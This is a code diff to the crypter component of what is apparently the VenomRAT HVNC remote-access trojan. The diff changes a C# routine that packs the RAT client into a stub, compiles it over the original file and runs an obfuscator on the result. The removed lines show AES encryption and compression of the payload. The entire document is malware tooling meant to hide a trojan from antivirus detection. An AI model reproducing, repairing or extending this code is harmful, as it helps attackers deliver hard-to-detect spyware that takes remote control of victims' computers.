@@ -1,29 +1,49 @@
 ﻿using System;
+using System.Diagnostics;
 using System.IO;
-using Client.Obfuscation;
+using System.Threading.Tasks;
+using Obfuscation;
 using VenomRAT_HVNC.Crypter.Algorithms;
-using VenomRAT_HVNC.Crypter.Settings;
+using VenomRAT_HVNC.Crypter.Other;
+using Settings = VenomRAT_HVNC.Crypter.Other.Settings;
 
 namespace VenomRAT_HVNC.Crypter;
 
 public class Program
 {
-    public static void Run(string filePathClient)
+    public static Task Run(string pathClient)
     {
-        string stub = Settings.Settings.Stub;
-        byte[] client = File.ReadAllBytes(filePathClient);
-        string passwordAesCompress = new GenerateKey(256).GenerateStrenghCharacter();
-        string codeAesCompressPayloadBase64 = Aes.AesEncryptBytes(Aes.Compress(client), passwordAesCompress);
+        if (string.IsNullOrEmpty(Settings.Stub))
+        {
+            throw new ArgumentNullException("pathClient");
+        }
 
-        stub = stub.Replace("#PASSWORD_AES_COMPRESS_STUB#", passwordAesCompress);
-        stub = stub.Replace("#PAYLOAD_AES_COMPRESS_STUB#", codeAesCompressPayloadBase64);
+        if (!File.Exists(pathClient))
+        {
+            throw new FileNotFoundException($"Le fichier '{pathClient}' n'existe pas.");
+        }
 
-        stub = stub.Replace(stub,Replace.Stub(stub));
-        
-        Compiler.CompileCSharpFile(stub,filePathClient,null);
-        Obfuscate.Run(filePathClient);
-        
-        //Compiler
-        //fonctions replace
+        try
+        {
+            string stub = Settings.Stub;
+
+            // Supposant que vous voulez remplacer un autre texte dans 'stub'
+            stub = stub.Replace(stub, Replace.Stub(stub, pathClient));
+
+            if (File.Exists(pathClient))
+            {
+                File.Delete(pathClient);
+            }
+
+            Compiler.CompileCSharpFile(stub, pathClient);
+            ObfuscateExe.Run(pathClient);
+        }
+        catch (Exception ex)
+        {
+            Debug.WriteLine($"Erreur lors de l'exécution : {ex.Message}");
+            throw;
+        }
+
+        return Task.CompletedTask;
     }
 }
